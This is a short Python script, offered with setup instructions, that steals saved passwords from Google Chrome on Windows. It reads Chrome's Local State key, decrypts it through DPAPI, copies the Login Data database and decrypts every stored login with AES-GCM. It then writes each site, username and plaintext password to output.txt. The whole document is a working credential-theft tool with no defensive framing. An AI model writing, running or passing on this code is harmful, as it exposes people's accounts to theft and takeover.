# frist run this code run this code in CMD :

    # pip install json
    # python -m pip install cryptography



import json
from base64 import b64decode
import win32crypt
import sqlite3 
import shutil
from Crypto.Cipher import AES
import platform

user = platform.node()

f = open("C:\\Users\\{}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State".format(user[:3]))
local_state = json.loads(f.read())

key = local_state["os_crypt"]["encrypted_key"]

#  1
key = b64decode(key) # Base 64 Decoder
key = key[5:]
#  2
key = win32crypt.CryptUnprotectData(key)[1]
###########################################
path = "C:\\Users\\{}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\".format(user[:3])
shutil.copy(path+"Login Data" , path+"database2") # Copy Database

database = sqlite3.connect(path+"database2")
cursor = database.cursor()

cursor.execute("select origin_url , username_value , password_value from logins")

result = cursor.fetchall()

def decrypt(password , key):
    iv = password[3:15]
    password = password[15:]
    
    cipher = AES.new(key , AES.MODE_GCM , iv)
    password = cipher.decrypt(password)
    password = password[:-16].decode()
    return password


for i in result:
    url = i[0]
    username = i[1]
    password = decrypt(i[2] , key)
    save = open("output.txt", "a")
    print("{} : ".format(url), file=save)
    print("\tusername : {}".format(username), file=save)
    print("\tpassword : {}".format(password), file=save)
    print()
    save.close()